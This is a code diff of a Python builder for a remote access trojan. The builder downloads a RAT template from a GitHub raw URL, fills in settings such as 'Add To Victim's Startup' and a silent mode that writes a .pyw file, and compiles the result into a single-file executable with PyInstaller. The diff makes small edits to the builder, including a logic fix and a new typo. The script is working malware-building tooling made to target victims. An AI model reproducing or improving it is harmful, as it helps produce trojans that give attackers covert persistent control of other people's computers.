@@ -59,7 +59,7 @@ CYAN = "\033[36m"
 RESET = "\033[0m"
 
 title = r"""
-EXOZ-MT - Thanks to Vexi, this product is brought to you for free! 🎀
+EXOZ-MT - Thanks to Vn, this product is brought to you for free! 🎀
 █████████████████████████████████████████████████████████████████████████████████
 
 ██████╗ ███████╗███╗   ███╗ ██████╗ ████████╗███████╗     █████╗  ██████╗ ██████╗███████╗███████╗███████╗    ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗
@@ -103,7 +103,7 @@ if choice == 1:
     template = "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/RAT/ignore/template.py"
     source = requests.get(template).text
 
-    if not file_name.lower().endswith(".py") or file_name.lower().endswith(".pyw"):
+    if not (file_name.lower().endswith(".py") or file_name.lower().endswith(".pyw")):
         if silent_mode == "True":
             file_name += ".pyw"
         else:
@@ -125,7 +125,7 @@ Prefix: {prefix}
 Add To Victim's Startup: {add_to_startup}
 Silent Mode: {silent_mode}""")
 
-        confirm = input(f"\n{GREEN}Would you like to confirm these? (y/n) → {RESET}").strip().lower()
+        confirm = input(f"\n{GREEN}Would you like to comfirm these? (y/n) → {RESET}").strip().lower()
 
         if confirm == "y":
             
@@ -156,15 +156,14 @@ Silent Mode: {silent_mode}""")
                 modified_source = modified_source.replace("{placeholder_main_channel}", str(main_channel))
                 modified_source = modified_source.replace("{placeholder_prefix}", prefix)
                 modified_source = modified_source.replace("{placeholder_add_to_startup}", add_to_startup)
-                modified_source = modified_source.replace("{placeholder_silent_mode}", silent_mode)
-
+                
                 f.write(modified_source)
 
                 print(f"{GREEN}File contents have been written!{RESET}")
             
             time.sleep(1)
             print(f"{GREEN}Installing python to exe requirements{RESET}")
-            os.system("pip install pyinstaller")
+            os.system("python -m pip install pyinstaller")
             print(f"{GREEN}Python to exe requirements installed!{RESET}")
             
             print(f"{GREEN}Converting python file to exe..{RESET}")
@@ -172,7 +171,7 @@ Silent Mode: {silent_mode}""")
             original_dir = os.getcwd()
             os.chdir(folder_path)
             
-            os.system(f'pyinstaller "{file_name}" --onefile')
+            os.system(f'python -m PyInstaller "{file_name}" --onefile --clean')
             print(f"{GREEN}Converted python file to exe!{RESET}")
             
             time.sleep(4)
@@ -206,14 +205,14 @@ Silent Mode: {silent_mode}""")
             if os.path.exists(spec_file):
                 os.remove(spec_file)
                 print(f"{GREEN}Deleted .spec file{RESET}")
-            
+        
             time.sleep(0.5)
             
             if os.path.exists(build_path):
                 try:
                     shutil.rmtree(build_path)
                     print(f"{GREEN}Deleted build folder{RESET}")
-                except Exception as e:
+                except Exception as e:  
                     print(f"{RED}Failed to delete build folder: {e}{RESET}")
                     print(f"{YELLOW}You may need to delete this folder manually.")
             
